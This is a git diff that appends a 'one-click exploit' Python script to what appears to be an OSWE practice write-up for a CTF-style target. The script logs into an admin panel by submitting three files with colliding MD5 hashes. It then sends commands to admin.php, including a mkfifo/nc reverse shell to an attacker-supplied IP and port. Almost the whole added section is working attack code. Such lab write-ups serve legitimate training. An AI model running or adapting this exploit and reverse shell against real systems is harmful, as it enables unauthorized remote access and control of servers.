@@ -148,6 +148,58 @@ Rooted! A bit CTFy, slightly frustrating, but still pretty cool
 ![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/3b9838b9-812f-4dec-ac56-b78c90cf307a)
 
 
+Hello! I'm back a few weeks later. Here's the one-click exploit
+
+````
+import sys, requests, urllib, socket, time, threading, re
+
+def main():
+	session = requests.Session()
+	#Login to the admin panel
+
+	url = server + '/d5fa314e8577e3a7b8534a014b4dcb221de823ad/'
+	headers = {"User-Agent": "curl/8.5.0", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
+	# This sends the 3  files with the same md5 hash. Requires that you have the 3 files already created (f1, f2 and f3)
+	with open('f1', 'rb') as f1:
+		username = urllib.parse.quote(f1.read())
+	with open('f2', 'rb') as f2:
+                password = urllib.parse.quote(f2.read())
+	with open('f3', 'rb') as f3:
+                code = urllib.parse.quote(f3.read())
+
+	data = "username={}&password={}&code={}&login=Login".format(username, password, code)
+	r = session.post(url, headers=headers, data=data)
+
+	if "Well Done" in r.text:
+		print("[+] Logged in successfully")
+
+	# RCE prep
+	url = url + 'admin.php'
+	data1 = {"command": "uname -a; id", "submit": "Submit Query"}
+	data2 = {"command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(attacker, port), "submit": "Submit Query"}
+
+	# Launch RCE
+	r = session.post(url, data=data1)
+	# Print "flag" first
+	print(re.findall(r"<pre>(.*?)</pred>", r.text, re.DOTALL)[0])
+	print("Don't forget to open the listener on port {}".format(port))
+	session.post(url, data=data2)
+
+if __name__ == '__main__':
+        try:
+                server = sys.argv[1].strip()
+                attacker = sys.argv[2].strip()
+                port = sys.argv[3].strip()
+        except:
+                print("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
+                sys.exit()
+        main()
+````
+
+![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/480798be-1bfa-4c24-a622-c00d46ed306b)
+
+
+
 
 
 
